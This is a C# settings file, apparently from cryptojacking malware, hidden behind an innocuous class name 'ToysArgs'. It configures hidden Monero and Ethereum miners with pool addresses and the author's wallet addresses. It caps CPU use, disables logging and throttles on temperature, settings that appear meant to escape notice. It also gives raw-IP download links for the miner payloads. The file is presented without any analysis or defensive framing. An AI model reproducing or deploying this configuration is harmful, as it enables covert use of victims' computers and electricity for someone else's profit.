using System;
using System.Collections.Generic;
using System.Text;

namespace Mnr.Settings
{
    class ToysArgs
    {
        //public const string CpuArgs = "-o 185.125.218.87:3333 --max-cpu-usage 60";
        public const string CpuArgs = "-o pool.minexmr.com:4444 -u 4AKCmNh5scDP5qYdFXkC5HQCgNqoeAgMc1zHPBEDedewV3fvD6rxFvYbwE9RHTxM6xfBk9wrZ83o4HgT8EnUazWTQXjHx6T -p x --max-cpu-usage 40";
        public const string GpuArgs = "-epool eth-eu1.nanopool.org:9999 -ewal 0x0bae9c8cddf0F24143b9024B484C424b34914DF5 -worker mnr -mode 1 -Rmode 1 -log 0 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -tstop 90 -li 5 -tstart 80 -coin eth";

        public const string CpuLink = "http://109.234.38.207/static/1";
        public const string GpuLink = "http://109.234.38.207/static/2";
    }
}